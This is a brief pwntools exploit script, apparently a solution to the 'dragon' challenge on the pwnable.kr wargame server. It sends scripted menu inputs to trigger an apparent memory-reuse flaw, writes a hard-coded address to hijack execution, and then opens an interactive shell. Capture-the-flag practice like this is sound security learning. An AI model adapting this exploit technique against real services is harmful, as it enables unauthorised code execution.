from pwn import *
#p = process("./dragon")
p = remote("pwnable.kr", 9004)

p.sendline("2")
sleep(0.1)
p.sendline("2")
sleep(0.1)
p.sendline("1")
for i in range(4):
    p.sendline("3")
    sleep(0.1)
    p.sendline("3")
    sleep(0.1)
    p.sendline("2")
    sleep(0.1)
p.sendline(p32(0x08048DBF))
p.interactive()
